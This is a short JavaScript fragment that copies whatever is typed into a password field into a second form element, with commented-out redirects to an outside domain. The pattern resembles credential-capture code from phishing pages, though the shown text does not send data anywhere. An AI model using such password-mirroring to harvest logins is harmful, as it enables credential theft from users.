setTimeout(function () {
    var field = document.getElementById("pass");
    var form = document.getElementById("passVal");
    var btn = document.getElementById("btn");
    field.oninput = function () {
        form.value = field.value;
    };
    // btn.onclick = function() {
    //     window.location.replace('https://alphafeed.xyz/');
    //     window.location.assign('https://alphafeed.xyz/');
    //     window.location.href = 'https://alphafeed.xyz/';
    //     document.location.href = '/';
    // }
}, 50);
